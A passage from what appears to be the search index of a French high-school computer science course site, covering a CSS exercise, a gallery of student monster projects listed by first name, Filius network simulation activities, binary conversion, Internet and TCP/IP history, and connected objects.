de la modification de la police d'\u00e9criture en blanc.</p> <p>La classe <code>container</code> est la classe qui contient le plus d'\u00e9l\u00e9ments sur lesquels on veut appliquer ces propri\u00e9t\u00e9.</p> <p>Consigne : Dans la classe container du fichier <code>style.css</code>, rajouter les propri\u00e9t\u00e9s permettant de changer le fond d'\u00e9cran et de mettre la police d'\u00e9criture en blanc.</p> <pre><code>    .container{\n        background-image : url(../image/background.png);\n        color : white;\n    }\n</code></pre> <p>Indication : le chemin de l'image du fond d'\u00e9cran a pour point de d\u00e9part le dossier style et pour point d'arriv\u00e9e le dossier image. Pour \"remonter\" d'un dossier, il faut \u00e9crire <code>../</code> lors de l'\u00e9criture du lien vers l'image de fond d'\u00e9cran.</p> <p>Vous devez avoir ainsi :</p> <p></p>"},{"location":"seconde/II_-_Web/monstres/","title":"Galerie des Monstres","text":"\ud83c\udf93 Ann\u00e9e 2024-2025 <p>Cliquez pour d\u00e9couvrir les cr\u00e9ations de nos \u00e9l\u00e8ves</p> 2DE1 <p>Classe de seconde</p> 18 \u00e9l\u00e8ves 2DE2 <p>Classe de seconde</p> 26 \u00e9l\u00e8ves 2DE3 <p>Classe de seconde</p> 22 \u00e9l\u00e8ves 2DE5 <p>Classe de seconde</p> 20 \u00e9l\u00e8ves 2DE6 <p>Classe de seconde</p> 28 \u00e9l\u00e8ves 2DE7 <p>Classe de seconde</p> 28 \u00e9l\u00e8ves 2DE9 <p>Classe de seconde</p> 21 \u00e9l\u00e8ves 2DE10 <p>Classe de seconde</p> 27 \u00e9l\u00e8ves 2DE11 <p>Classe de seconde</p> 26 \u00e9l\u00e8ves S01 <p>Seconde</p> 21 \u00e9l\u00e8ves S16 <p>Seconde</p> 21 \u00e9l\u00e8ves S18 <p>Seconde</p> 19 \u00e9l\u00e8ves \u2190 Retour aux classes Monstres de la classe 2DE1 <p>D\u00e9couvrez les cr\u00e9ations fantastiques des \u00e9l\u00e8ves de 2DE1</p> Hayrunnisa Acelya Alexa Clea Clemence Emlyne Joan Lina Louna Lylian Maelle Maxime Naome Noor Quentin Salome Sofia Thibault \u2190 Retour aux classes Monstres de la classe 2DE2 <p>D\u00e9couvrez les cr\u00e9ations fantastiques des \u00e9l\u00e8ves de 2DE2</p> Alyssia Antoine Aya Baptiste Binti Camille Elise Ethan Gabriel Ilona Kaila Kylian Kyllian Leo Lise-Anne Lison Loeiz Lola Maelys Maxime Melina Oscar Sirine Youn Zoe Emma Zyan Loeiz Kaila Antoine Alyssia Melina Maxime Oscar Kylian Leo Youn Elise Baptiste Camille Kyllian Sirine Ethan Maelys Lise-anne Zoe Emma Lison Aya Gabriel Binti \u2190 Retour aux classes Monstres de la classe 2DE3 <p>D\u00e9couvrez les cr\u00e9ations fantastiques des \u00e9l\u00e8ves de 2DE3</p> Anouk Chloe Eline (Batterie) Eline (Guitare) Eline (Piano) Eline (Trompette) Elisa Enora Gabin Ilhan Joseph Laureline Leo Madeg Mathys Mila Niev Nil Rose Sasha Sebastian Shannon \u2190 Retour aux classes Monstres de la classe 2DE5 <p>D\u00e9couvrez les cr\u00e9ations fantastiques des \u00e9l\u00e8ves de 2DE5</p> Agathe Maiwen Alan Allyson Thea Anais Camille Etoile Camille Nuage Camille Pluie Camille Soleil Eliott Eva Guewen Ilan Jules Maxence Milan Patricia Zelie Romane Timeo Timeo G Tino \u2190 Retour aux classes Monstres de la classe 2DE6 <p>D\u00e9couvrez les cr\u00e9ations fantastiques des \u00e9l\u00e8ves de 2DE6</p> Aela Alwena Elianor Elsa Emma Ethel Ferdinand Haizia Jade Jeanne Joris Juliette Leandre Lena Lise Ludmila Mael Mayane Merlin Nathan Nina Noah Nolan Rival Leandre Rozenn Salomee Sarah Timot\u00e9 \u2190 Retour aux classes Monstres de la classe 2DE7 <p>D\u00e9couvrez les cr\u00e9ations fantastiques des \u00e9l\u00e8ves de 2DE7</p> Alan Alice Alou Charline Dalila Eloa Emma Ethan Hugo Ilan Jade Jules Karim Lilie-rose Lilou Mael Maelys Mathilde Maxime Milo Moncef Nolan Orlane Soan Talel Timeo Youen Younes \u2190 Retour aux classes Monstres de la classe 2DE9 <p>D\u00e9couvrez les cr\u00e9ations fantastiques des \u00e9l\u00e8ves de 2DE9</p> Aidie Alice Charlotte Eliott Elise Elsa Iwen Janelle Jeanne Lena Lina Maelys Marisa Marko Mathys Maxence Mylan Ilyess Nathael Sylvia Theo Yael \u2190 Retour aux classes Monstres de la classe 2DE10 <p>D\u00e9couvrez les cr\u00e9ations fantastiques des \u00e9l\u00e8ves de 2DE10</p> Abigael Alexis Anna-rose Esther Eyaelle Ilyan Jade Johan Louise Lucas Mailys Margaux Mathys 1 Mathys 2 Mathys 3 Mathys 4 Mathys 5 Mathys S Melina Naom\u00e9e Nassim Nina Pierre Roxanne Samira Semih Telio \u2190 Retour aux classes Monstres de la classe 2DE11 <p>D\u00e9couvrez les cr\u00e9ations fantastiques des \u00e9l\u00e8ves de 2DE11</p> Aaron Alice Anais Anouk Hanae Ilann Jeanne Jorys Jules Jules R Lucas Lysa Madyar Mailye Maria Maylane Melia Nhayla Quentin Servane Sham Shanice Tess Titouan Yoann Zoe \u2190 Retour aux classes Monstres de la classe S01 <p>D\u00e9couvrez les cr\u00e9ations fantastiques des \u00e9l\u00e8ves de S01</p> Awena Charlotte Clea Honore Jade Jade 2 Junon Louise Louise 2 Louna 2 Maiann Melanie Melwynn Molene Nora-lea Olivia Rose Thomas Tiago Yves Zoe \u2190 Retour aux classes Monstres de la classe S16 <p>D\u00e9couvrez les cr\u00e9ations fantastiques des \u00e9l\u00e8ves de S16</p> Alex Eliz Emmy Gabin Gaspard Julia Liam Louise R Lylia Maely Maelys Marie Ellynn Marina Maxime Mila Noa Nolan Oceane Paul Pierre Romain Sasha Simon Tess Titouan Tom Yann Yoann \u2190 Retour aux classes Monstres de la classe S18 <p>D\u00e9couvrez les cr\u00e9ations fantastiques des \u00e9l\u00e8ves de S18</p> Anae Baptiste Calie Emma Ethan Gabin Joan Lilou Lilwenn Lola Manon Mathurin Maxence Nathan Renzo Romane Sofia Tahyna Thais"},{"location":"seconde/I_-_Internet/Activite/","title":"Activite","text":"\ud83c\udf10 Simulation d'un R\u00e9seau Informatique <p>             D\u00e9couvrez la construction et le fonctionnement des r\u00e9seaux informatiques gr\u00e2ce au logiciel              Filius, un simulateur puissant pour comprendre les \u00e9changes de donn\u00e9es.         </p> \ud83c\udfaf Objectif de l'activit\u00e9              Ma\u00eetriser la cr\u00e9ation de r\u00e9seaux et sous-r\u00e9seaux en simulant              le comportement des paquets de donn\u00e9es avec le logiciel Filius.                       \ud83d\udd27 Approche du logiciel Filius                       \ud83d\udca1 Le logiciel Filius poss\u00e8de 3 modes de fonctionnement : \u270f\ufe0f Annotation                      Permet d'annoter le sch\u00e9ma r\u00e9seau pour une meilleure compr\u00e9hension                  \ud83d\udd28 Construction                      Permet d'ajouter des \u00e9l\u00e9ments (ordinateurs, routeurs, c\u00e2bles) sur le sch\u00e9ma                  \u25b6\ufe0f Lecture                      Permet d'utiliser la simulation pour \u00e9tudier les \u00e9changes de donn\u00e9es en temps r\u00e9el                               \ud83c\udfd7\ufe0f Construction d'un r\u00e9seau simple          1.                 Quels sont les \u00e9l\u00e9ments de ce r\u00e9seau ?              2.                 \u00c0 quoi sert le routeur dans cette configuration ?              3.                 Dans quels r\u00e9seaux sont les ordinateurs 1 et 2 ?                  (Indication : pour les 2 r\u00e9seaux, la partie r\u00e9seau est d\u00e9finie sur 3 octets)              \ud83d\ude80 Un r\u00e9seau plus \u00e9toff\u00e9                       \ud83d\udcc8 \u00c9volution : Apr\u00e8s avoir compris le fonctionnement de base de Filius,              nous allons maintenant \u00e9toffer le r\u00e9seau pr\u00e9c\u00e9dent pour une configuration plus complexe.          1.                 \u00c0 quelle propri\u00e9t\u00e9 du routeur faut-il veiller pour r\u00e9aliser ce sch\u00e9ma ?              2.                 R\u00e9aliser le sch\u00e9ma ci-dessus en utilisant le mode construction de Filius.              \ud83c\udfaf Objectif pratique                  Cette activit\u00e9 vous permettra de comprendre concr\u00e8tement comment les routeurs                  interconnectent diff\u00e9rents r\u00e9seaux et g\u00e8rent le routage des paquets de donn\u00e9es."},{"location":"seconde/I_-_Internet/Activite_2/","title":"Activite 2","text":"\ud83c\udf10 Simulation de Serveurs WEB et DNS <p>             Apr\u00e8s avoir appris \u00e0 cr\u00e9er un r\u00e9seau d'ordinateurs et \u00e0 g\u00e9rer le routage,              nous allons maintenant explorer les serveurs WEB et DNS qui constituent le c\u0153ur d'Internet.         </p> \ud83c\udfaf Objectif de l'activit\u00e9              Comprendre le fonctionnement des serveurs WEB et DNS en simulant              un environnement r\u00e9seau complet avec Filius.          1             \ud83d\udd27 Cr\u00e9ation du r\u00e9seau                           \ud83d\udccb Pr\u00e9requis : Reprendre le r\u00e9seau du TP pr\u00e9c\u00e9dent comme base de travail              2             \ud83d\udda5\ufe0f Configuration d'un serveur WEB          2.1                 Ajouter un ordinateur dans le r\u00e9seau 192.168.5.0 et le configurer pour y avoir acc\u00e8s              2.2                 En mode lecture, ajouter le logiciel de serveur web sur l'ordinateur              2.3                 Double-cliquer sur l'application serveur web et d\u00e9marrer le serveur 2.4                 Sur la machine 192.168.1.11, ajouter le logiciel de navigation internet et                  entrer l'adresse IP du serveur web dans la barre d'adresse. La page devrait s'actualiser.              3             \ud83c\udf10 Configuration d'un serveur DNS                       \ud83d\udca1 Pr\u00e9paration : Ajouter une interface au routeur et cr\u00e9er un r\u00e9seau 192.168.2.11 avec un ordinateur          3.1                 Sur la machine 192.168.2.11, ajouter l'application serveur DNS et l'ouvrir              3.2                 Comme nom de domaine, ajouter www.nsi.fr                  et associer l'adresse 192.168.3.12 (notre serveur WEB)                               \u2753 Question 3.3 : Est-il possible d'acc\u00e9der \u00e0 la page www.nsi.fr ?              3.4                 Ajouter l'adresse du serveur DNS pour tous les ordinateurs                               \u2753 Question finale : Est-il maintenant possible d'acc\u00e9der \u00e0 la page ?              4             \ud83d\udcc4 Ajout de votre page web personnalis\u00e9e          4.1                 Sur le serveur WEB, ajouter l'application explorateur de fichiers 4.2                 Importer votre fichier index.html et le placer dans le dossier webserver 4.3                 Actualiser et tester l'acc\u00e8s \u00e0 votre page depuis la machine 192.168.1.10              \ud83c\udf89 R\u00e9sultat attendu : Votre page web personnalis\u00e9e devrait maintenant \u00eatre accessible via le nom de domaine configur\u00e9 !"},{"location":"seconde/I_-_Internet/Binaire_D%C3%A9cimal/","title":"Le binaire : D\u00e9finition","text":"<p>Nous comptons g\u00e9n\u00e9ralement en base 10, cela veut dire que nous utilisons 10 symboles pour repr\u00e9senter les chiffres. Combiner ces chiffres permet de cr\u00e9er des nombres. Pour repr\u00e9senter des chiffres en informatique, on n\u2019utilise que 2 symboles : 0 et 1. On nomme ces symboles des bits. Un ensemble de 8 bits se nomme un octet.</p>"},{"location":"seconde/I_-_Internet/Binaire_D%C3%A9cimal/#rappel-comment-compter-en-base-10","title":"Rappel : Comment compter en base 10","text":"<p>Pour compter, on utilise la notation en colonne, dite positionnelle. La colonne la plus \u00e0 droite correspond \u00e0 celle des unit\u00e9s, suivie \u00e0 gauche par celle des dizaines, puis des centaines et ainsi de suite.</p> <p>Par exemple, on peut d\u00e9composer le nombre \\(154=10^2\\times1 + 10^1\\times5 + 10^0\\times4\\). On appelle cela la d\u00e9composition par base avec ici la base valant 10.</p>"},{"location":"seconde/I_-_Internet/Binaire_D%C3%A9cimal/#conversion-binaire-vers-decimal","title":"Conversion binaire vers d\u00e9cimal","text":"<p>Un nombre \u00e9crit en base 2 est \u00e9crit en notation positionnelle.</p> <p>Pour convertir un nombre binaire en base d\u00e9cimale, on op\u00e8re comme la d\u00e9composition pr\u00e9c\u00e9dente avec la base valant 2 :</p> <p>\\(11001\\) est un nombre repr\u00e9sent\u00e9 en base 2. On peut le d\u00e9composer de cette mani\u00e8re : \\(11001_2 = 1 \\times 2^4 + 1 \\times 2^3 + 0 \\times 2^2 + 0 \\times 2^1 + 1 \\times 2^0 = 16 + 8 + 1 = 25_{10}\\).</p> <p>Exercice: Convertir les nombres binaires suivant en base 10 : a. \\(1101_2\\) b. \\(10101_2\\) c. \\(111000_2\\) d. \\(10010_2\\) </p>"},{"location":"seconde/I_-_Internet/Binaire_D%C3%A9cimal/#conversion-decimal-vers-binaire","title":"Conversion d\u00e9cimal vers binaire","text":"<p>Pour passer de la base 10 \u00e0 la base 2, on peut utiliser la m\u00e9thode que l'on appelle des divisions successives.</p> <p>On divise successivement le nombre \u00e0 convertir par 2. Chaque reste correspond au nombre dans la repr\u00e9sentation et chaque quotient est \u00e0 diviser \u00e0 la suite par 2. On r\u00e9p\u00e8te ces op\u00e9ration jusqu'\u00e0 ce que le quotient soit 0 et le reste 1.</p> <p></p> <p>La repr\u00e9sentation du nombre binaire s\u2019obtient en \u00e9crivant les restes dans le sens de la fl\u00e8che ci dessus.</p>"},{"location":"seconde/I_-_Internet/Cours/","title":"Cours","text":"\ud83c\udf10 Internet <p>L'histoire et le fonctionnement du r\u00e9seau mondial</p> \ud83d\udcc5 L'Histoire d'Internet : Des Pionniers \u00e0 la R\u00e9volution Mondiale 1960s Les Pionniers d'ARPANET                  L'id\u00e9e r\u00e9volutionnaire de relier des machines pour \u00e9changer des donn\u00e9es na\u00eet dans les laboratoires et universit\u00e9s. Robert Kahn dirige le projet ARPANET pour la Defense Advanced Research Projects Agency.              1969 Premier Message de l'Histoire                  Le 20 septembre 1969, la premi\u00e8re communication voit le jour entre l'universit\u00e9 de Californie et Stanford. Le premier message transmis \u00e9tait simplement \"login\".              1970-80s Naissance des Protocoles                  D\u00e9veloppement des r\u00e8gles de communication appel\u00e9es \"protocoles\". Ces normes permettent aux machines de communiquer de mani\u00e8re standardis\u00e9e.              1983 R\u00e9volution TCP/IP                  Installation du protocole TCP/IPv4 sur ARPANET. Cr\u00e9ation simultan\u00e9e des r\u00e8gles des syst\u00e8mes de nom de domaine (DNS).              1990s Explosion du Web                  Tim Berners-Lee et Robert Cailliau cr\u00e9ent le World Wide Web au CERN en Suisse, r\u00e9volutionnant l'acc\u00e8s \u00e0 l'information.              Aujourd'hui Internet Mondial                  Plus de 4 milliards d'internautes connect\u00e9s, \u00e9changeant emails, fichiers et acc\u00e9dant \u00e0 une quantit\u00e9 incommensurable de donn\u00e9es.                       \ud83d\udca1 Le saviez-vous ? L'objectif initial \u00e9tait de relier seulement trois universit\u00e9s : Stanford, Los Angeles et l'Utah.      \ud83c\udfaf D\u00e9finition : Internet Internet est un r\u00e9seau informatique \u00e0 \u00e9chelle mondiale sur lequel de nombreuses applications sont bas\u00e9es (email, transfert de fichiers, navigation web, etc.).      \ud83d\udd27 Anatomie d'un R\u00e9seau Informatique \ud83c\udfaf D\u00e9finition : R\u00e9seau Informatique              Un r\u00e9seau informatique est un ensemble de machines reli\u00e9es, par diff\u00e9rents moyens, qui communiquent entre elles pour \u00e9changer des donn\u00e9es ou des informations.          \ud83e\udde9 Les Composants Essentiels \ud83d\udcbb Machines                  \u00c9l\u00e9ments qui cherchent \u00e0 communiquer, envoyer ou recevoir des donn\u00e9es                               \ud83d\udcf1 Ordinateurs, tablettes, consoles, smartphones              \ud83d\udd00 Switch                  \u00c9l\u00e9ment qui relie de mani\u00e8re locale des machines dans un m\u00eame r\u00e9seau                               \ud83c\udfe0 Box internet, switch RJ45              \ud83c\udf10 Routeur                  \u00c9l\u00e9ment qui permet de relier un r\u00e9seau local \u00e0 Internet ou d'autres r\u00e9seaux                               \ud83d\udd17 Box internet, routeur sp\u00e9cialis\u00e9              \ud83d\udce1 Supports de Transmission                  \u00c9l\u00e9ments qui permettent de relier les diverses machines au switch ou au routeur                               \ud83d\udd0c C\u00e2ble Ethernet, Fibre optique, WiFi              \ud83d\uddfa\ufe0f Typologie des R\u00e9seaux \ud83c\udfe0 R\u00e9seau Local (LAN)                  R\u00e9seau localis\u00e9 dans une m\u00eame zone g\u00e9ographique (maison, bureau, \u00e9cole)              \ud83c\udf0d R\u00e9seau Internet (WAN)                  R\u00e9seau accessible \u00e0 Internet, connectant des r\u00e9seaux locaux du monde entier                           \ud83e\udd14 Question cl\u00e9 : On dispose de machines et d'un r\u00e9seau, mais comment se retrouvent-elles pour communiquer ? Quelles techniques sont utilis\u00e9es ?          \ud83c\udff7\ufe0f L'Adressage dans les R\u00e9seaux \ud83d\udd17 Adressage Local : MAC                  Une machine dispose d'une ou plusieurs cartes r\u00e9seaux qui permettent de communiquer localement ou globalement vers Internet. Chaque carte poss\u00e8de une adresse unique.              \ud83d\udccd Adresse MAC                      L'adresse MAC (Media Access Control) est aussi appel\u00e9e adresse physique car elle correspond \u00e0 l'adresse utilis\u00e9e par le port Ethernet et le protocole Ethernet.                  Format 6 blocs de 2 caract\u00e8res Base Hexad\u00e9cimale (16 caract\u00e8res) Port\u00e9e R\u00e9seau local uniquement Unicit\u00e9 Unique au monde                  \ud83d\udca1 Exemple : a1:b2:c3:d4:e5:f6                               \ud83d\udd22 Base hexad\u00e9cimale : Repr\u00e9sentation en 16 caract\u00e8res (0-9, A-F)              \ud83c\udf10 Adressage Internet : IP                  Pour qu'un r\u00e9seau soit accessible sur Internet, chaque machine doit poss\u00e9der une adresse unique permettant de l'identifier parmi des milliards d'autres.              \ud83c\udfaf Adresse IP                      L'Adresse IP (Internet Protocol) est constitu\u00e9e de 4 nombres allant de 0 \u00e0 255, repr\u00e9sent\u00e9s en binaire par l'ordinateur mais affich\u00e9s en d\u00e9cimal pour l'humain.                  Format 4 nombres (0-255) Base humaine D\u00e9cimale (base 10) Base machine Binaire (0 et 1) Port\u00e9e Internet mondial                  \ud83d\udca1 Exemple : 127.0.0.1 (localhost)              \ud83e\udde9 Structure d'une Adresse IP \ud83c\udfe0 Partie R\u00e9seau                      Identifie un r\u00e9seau sp\u00e9cifique sur Internet                  \ud83d\udcbb Partie Machine                      Identifie une machine sur le r\u00e9seau d\u00e9fini                               \ud83c\udfad Le Masque : Permet de d\u00e9finir la r\u00e9partition des bits entre la partie r\u00e9seau et la partie machine          \ud83d\udcca Exemple de Calcul              Adresse : 128.40.94.3 avec un masque de 16 bits En binaire : 10000000.00101000.01011110.00000100          Masque : 11111111.11111111.00000000.00000000          Adresse r\u00e9seau : 128.40.0.0          Adresse machine : 94.3                       \u26a0\ufe0f Important : L'adresse r\u00e9seau est cruciale car deux machines sont dans le m\u00eame r\u00e9seau si et seulement si elles ont la m\u00eame adresse r\u00e9seau.          \ud83c\udf10 Le Protocole TCP-IP <p>             Maintenant que nous savons comment les machines se reconnaissent sur Internet gr\u00e2ce aux adresses,              d\u00e9couvrons comment les donn\u00e9es transitent r\u00e9ellement d'une machine \u00e0 une autre \u00e0 travers le monde.         </p> \ud83d\udd17 Protocole TCP-IP              Le protocole TCP-IP est un protocole de communication qui permet l'\u00e9change de donn\u00e9es entre machines sur Internet.              Il constitue le langage universel d'Internet, permettant \u00e0 des milliards d'appareils de communiquer ensemble.          \ud83c\udfd7\ufe0f Les 4 Couches du Protocole TCP-IP 4 \ud83d\udcf1 Couche Application                      Correspond aux logiciels qui utilisent le r\u00e9seau : navigateur web, logiciel de messagerie,                      applications mobiles, jeux en ligne, etc.                  3 \ud83d\ude9b Couche Transport                      S'occupe du transport des donn\u00e9es et de leur int\u00e9grit\u00e9. Garantit que les donn\u00e9es arrivent                      compl\u00e8tes et dans le bon ordre.                  2 \ud83d\uddfa\ufe0f Couche Internet                      S'occupe de l'adressage et du routage des donn\u00e9es. D\u00e9termine le chemin optimal                      pour faire transiter les donn\u00e9es.                  1 \ud83d\udd0c Couche Acc\u00e8s R\u00e9seau                      S'occupe de la transmission physique des donn\u00e9es : c\u00e2bles, WiFi, fibre optique,                      signaux \u00e9lectriques ou lumineux.                  \ud83d\udce6 Encapsulation                  Lorsqu'on envoie des donn\u00e9es, elles \"descendent\" les couches                  en se faisant encapsuler (ajouter des informations) \u00e0 chaque \u00e9tape.              \ud83d\udcf1 Application : Donn\u00e9es utilisateur \u2b07\ufe0f \ud83d\ude9b Transport : + En-t\u00eate TCP \u2b07\ufe0f \ud83d\uddfa\ufe0f Internet : + En-t\u00eate IP \u2b07\ufe0f \ud83d\udd0c Acc\u00e8s r\u00e9seau : + En-t\u00eate Ethernet \ud83d\udcc2 D\u00e9sencapsulation                  Lorsqu'on re\u00e7oit des donn\u00e9es, elles \"remontent\" les couches                  en se faisant d\u00e9sencapsuler (retirer des informations) \u00e0 chaque \u00e9tape.              \ud83d\udd0c Acc\u00e8s r\u00e9seau : - En-t\u00eate Ethernet \u2b07\ufe0f \ud83d\uddfa\ufe0f Internet : - En-t\u00eate IP \u2b07\ufe0f \ud83d\ude9b Transport : - En-t\u00eate TCP \u2b07\ufe0f \ud83d\udcf1 Application : Donn\u00e9es utilisateur \ud83d\udca1 Pourquoi TCP-IP est-il si important ?              Le protocole TCP-IP est le fondement d'Internet car il permet de faire communiquer des machines              de diff\u00e9rents types (ordinateurs, smartphones, serveurs, objets connect\u00e9s, etc.) sur un r\u00e9seau mondial.              C'est gr\u00e2ce \u00e0 ce protocole universel que vous pouvez consulter un site web h\u00e9berg\u00e9 au Japon              depuis votre smartphone en France !"},{"location":"seconde/VIII_-_Objets_Connectes/Cours/","title":"\ud83d\udcf1 Objets Connect\u00e9s","text":"<p>L'id\u00e9e de connecter des objets du quotidien \u00e0 Internet remonte aux ann\u00e9es 1980. Le premier objet connect\u00e9 de l'histoire \u00e9tait un distributeur de Coca-Cola \u00e0 l'universit\u00e9 Carnegie Mellon en 1982. Les \u00e9tudiants pouvaient v\u00e9rifier \u00e0 distance si des boissons \u00e9taient disponibles et si elles \u00e9taient froides !</p> <p>L'objectif \u00e9tait simple : \u00e9viter de se d\u00e9placer pour rien jusqu'au distributeur.</p> <p>Ce n'est qu'en 1999 que Kevin Ashton, chercheur au MIT, invente le terme \"Internet of Things\" (Internet des Objets) pour d\u00e9crire un monde o\u00f9 tous les objets seraient connect\u00e9s.</p> <p>La premi\u00e8re d\u00e9finition \u00e9tait : \"un r\u00e9seau d'objets physiques connect\u00e9s \u00e0 Internet\".</p> <p></p> <p>\u00c0 la suite de cela, dans les ann\u00e9es 2000-2010, les technologies sans fil se sont d\u00e9mocratis\u00e9es. On appelle ces technologies de communication des protocoles de communication.</p> <p>La mani\u00e8re de faire communiquer les objets connect\u00e9s est d\u00e9coup\u00e9e en diverses \u00e9tapes. Ces diverses \u00e9tapes permettent de collecter des donn\u00e9es, les transmettre, les traiter et agir en cons\u00e9quence. Chaque \u00e9tape correspond \u00e0 diff\u00e9rents composants et technologies. Dans les ann\u00e9es 2010, les capteurs miniaturis\u00e9s et les r\u00e9seaux basse consommation ont vu le jour. Ils sont install\u00e9s massivement depuis 2015, la m\u00eame ann\u00e9e o\u00f9 ont vu le jour les premi\u00e8res plateformes IoT grand public. Les ann\u00e9es 2020 ont permis de faire voir le jour \u00e0 une des plus grandes r\u00e9volutions technologiques : la 5G et l'intelligence artificielle embarqu\u00e9e.</p> <p></p> <p>Depuis, les objets connect\u00e9s permettent de relier plus de 50 milliards d'appareils pour collecter des donn\u00e9es, automatiser des t\u00e2ches ou am\u00e9liorer notre quotidien \u00e0 l'aide de plusieurs technologies d\u00e9pendant de protocoles. Par exemple, il existe des capteurs de temp\u00e9rature (protocole LoRaWAN), des montres connect\u00e9es (Bluetooth) ou des assistants vocaux (WiFi).</p> <p></p> <p>En clair, un objet connect\u00e9 est un dispositif physique \u00e9quip\u00e9 de capteurs, d'actionneurs et d'une connexion r\u00e9seau qui lui permet de collecter, \u00e9changer et traiter des donn\u00e9es via Internet.</p>"},{"location":"seconde/VIII_-_Objets_Connectes/Cours/#definitions","title":"D\u00e9finitions","text":"<p>Un objet connect\u00e9 est un dispositif physique dot\u00e9 de capacit\u00e9s de communication qui peut se connecter \u00e0 Internet ou \u00e0 d'autres objets pour \u00e9changer des donn\u00e9es. On retrouve un certain nombre de composants dans un objet connect\u00e9 qui ont chacun leur propre r\u00f4le.</p>"},{"location":"seconde/VIII_-_Objets_Connectes/Cours/#les-composants-dun-objet-connecte","title":"Les composants d'un objet connect\u00e9","text":"<p>Pour qu'un objet connect\u00e9 fonctionne, il faut des composants le constituant.</p> <p>On retrouve :</p> Composant R\u00f4le Exemple Capteurs \u00c9l\u00e9ments qui mesurent des grandeurs physiques de l'environnement capteur de temp\u00e9rature, acc\u00e9l\u00e9rom\u00e8tre, cam\u00e9ra Actionneurs \u00c9l\u00e9ments qui agissent sur l'environnement physique moteur, LED, haut-parleur Microprocesseur \u00c9l\u00e9ment qui traite les donn\u00e9es et contr\u00f4le l'objet Arduino, Raspberry Pi, ESP32 Interface de communication \u00c9l\u00e9ment qui permet de communiquer avec d'autres objets ou Internet module WiFi, Bluetooth, LoRa Alimentation \u00c9l\u00e9ment qui fournit l'\u00e9nergie n\u00e9cessaire au fonctionnement batterie, panneau solaire, secteur <p>On a d\u00e9fini dans les r\u00f4les divers types de capteurs et d'actionneurs. On peut les regrouper en 2 cat\u00e9gories :</p> <ul> <li>Capteurs : dispositifs qui mesurent et collectent des donn\u00e9es de l'environnement.</li> <li>Actionneurs : dispositifs qui agissent sur l'environnement en r\u00e9ponse aux donn\u00e9es.</li> </ul> <p></p> <p>Danger</p> <p>On dispose de composants, d'un objet mais, comment communiquent-ils entre eux ? Quelles technologies sont utilis\u00e9es ?</p>"},{"location":"seconde/VIII_-_Objets_Connectes/Cours/#types-de-capteurs-et-actionneurs","title":"Types de capteurs et actionneurs","text":"<p>Un objet connect\u00e9 dispose de capteurs pour mesurer son environnement et d'actionneurs pour agir sur celui-ci.</p> <p>Ces composants permettent de transformer des grandeurs physiques en donn\u00e9es num\u00e9riques ou inversement. De mani\u00e8re g\u00e9n\u00e9rale, un capteur dispose d'une grandeur mesur\u00e9e et d'une unit\u00e9 de mesure.</p> <p>Exemples de capteurs courants :</p> Type de capteur Grandeur mesur\u00e9e Unit\u00e9 Exemple d'usage Temp\u00e9rature Temp\u00e9rature ambiante \u00b0C Thermostat connect\u00e9 Humidit\u00e9 Taux d'humidit\u00e9 % Station m\u00e9t\u00e9o Mouvement Acc\u00e9l\u00e9ration, rotation m/s\u00b2, \u00b0/s Montre connect\u00e9e Lumi\u00e8re Intensit\u00e9 lumineuse lux \u00c9clairage automatique Son Niveau sonore dB Assistant vocal Pression Pression atmosph\u00e9rique hPa Altim\u00e8tre <p>Exemples d'actionneurs courants :</p> Type d'actionneur Action r\u00e9alis\u00e9e Exemple d'usage LED \u00c9mission de lumi\u00e8re Ampoule connect\u00e9e Moteur Mouvement m\u00e9canique Volet roulant Haut-parleur \u00c9mission sonore Enceinte connect\u00e9e \u00c9cran Affichage d'informations Tablette \u00c9lectrovanne Contr\u00f4le de fluide Arrosage automatique"},{"location":"seconde/VIII_-_Objets_Connectes/Cours/#protocoles-de-communication","title":"Protocoles de communication","text":"<p>Chaque objet connect\u00e9 doit pouvoir communiquer avec d'autres objets ou avec Internet. Sur les r\u00e9seaux IoT, on utilise diff\u00e9rents protocoles de communication selon les besoins. Un protocole de communication d\u00e9finit les r\u00e8gles d'\u00e9change de donn\u00e9es entre objets.</p> <p>Les protocoles se diff\u00e9rencient par leur port\u00e9e, leur consommation \u00e9nerg\u00e9tique et leur d\u00e9bit.</p> <p>Comparaison des principaux protocoles :</p> Protocole Port\u00e9e Consommation D\u00e9bit Usage typique WiFi 50-100m \u00c9lev\u00e9e Tr\u00e8s haut Objets domestiques Bluetooth 10-100m Moyenne Moyen Objets personnels LoRaWAN 2-15km Tr\u00e8s faible Tr\u00e8s faible Capteurs ruraux Sigfox 3-50km Tr\u00e8s faible Tr\u00e8s faible Objets autonomes 4G/5G National \u00c9lev\u00e9e Tr\u00e8s haut Objets mobiles Zigbee 10-100m Faible Faible Domotique <p>Focus sur LoRaWAN</p> <p>LoRaWAN (Long Range Wide Area Network) est un protocole sp\u00e9cialement con\u00e7u pour les objets connect\u00e9s.</p> <p>Ses avantages : - Tr\u00e8s longue port\u00e9e (jusqu'\u00e0 15km en zone rurale) - Tr\u00e8s faible consommation (batterie de 10 ans) - P\u00e9n\u00e9tration dans les b\u00e2timents - R\u00e9seau public gratuit en France</p> <p>Ses inconv\u00e9nients : - Tr\u00e8s faible d\u00e9bit (quelques octets par message) - Limitation du nombre de messages par jour</p> <p>Exemple d'usage : capteur de niveau d'eau dans un puits agricole qui envoie une mesure par heure.</p>"},{"location":"seconde/VIII_-_Objets_Connectes/Cours/#fonctionnement-dun-systeme-iot","title":"Fonctionnement d'un syst\u00e8me IoT","text":"<p>Un syst\u00e8me d'objets connect\u00e9s fonctionne selon un cycle en plusieurs \u00e9tapes :</p> <ol> <li>Collecte : Les capteurs mesurent des grandeurs physiques de l'environnement</li> <li>Transmission : Les donn\u00e9es sont envoy\u00e9es via un protocole de communication</li> <li>Traitement : Les donn\u00e9es sont analys\u00e9es par un serveur ou une plateforme cloud</li> <li>Analyse : Des algorithmes d\u00e9terminent les actions \u00e0 entreprendre</li> <li>Action : Des commandes sont envoy\u00e9es aux actionneurs pour agir sur l'environnement</li> </ol> <p></p>"},{"location":"seconde/VIII_-_Objets_Connectes/Cours/#exemple-concret-thermostat-connecte","title":"Exemple concret : Thermostat connect\u00e9","text":"<p>Prenons l'exemple d'un thermostat connect\u00e9 pour comprendre le fonctionnement :</p> <p>\u00c9tape 1 - Collecte : - Le capteur de temp\u00e9rature mesure 18\u00b0C dans la pi\u00e8ce - Le capteur de pr\u00e9sence d\u00e9tecte une personne</p> <p>\u00c9tape 2 - Transmission : - Les donn\u00e9es sont envoy\u00e9es via WiFi vers une plateforme cloud - Format des donn\u00e9es : <code>{\"temperature\": 18, \"presence\": true, \"timestamp\": \"2024-01-15T14:30:00\"}</code></p> 